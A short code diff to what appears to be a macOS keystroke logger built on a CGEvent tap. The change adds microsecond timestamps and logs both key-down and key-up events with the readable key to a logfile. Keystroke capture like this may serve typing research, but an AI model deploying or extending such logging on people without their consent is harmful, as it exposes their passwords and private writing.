@@ -1,4 +1,5 @@
 #include "keylogger.h"
+#include <sys/time.h>
 
 CGEventFlags lastFlags = 0;
 
@@ -97,15 +98,15 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     }
     lastFlags = flags;
 
-    // Only log key down events.
-    if (!down) {
-        return event;
-    }
+    struct timeval tv;
+    gettimeofday(&tv, NULL);
+    double time_in_seconds = tv.tv_sec + (tv.tv_usec / 1000000.0);
+
 
     // Print the human readable key to the logfile.
     bool shift = flags & kCGEventFlagMaskShift;
     bool caps = flags & kCGEventFlagMaskAlphaShift;
-    fprintf(logfile, "%s", convertKeyCode(keyCode, shift, caps));
+    fprintf(logfile, "%.6f %d %s\n", time_in_seconds, down, convertKeyCode(keyCode, shift, caps));
     fflush(logfile);
     return event;
 }
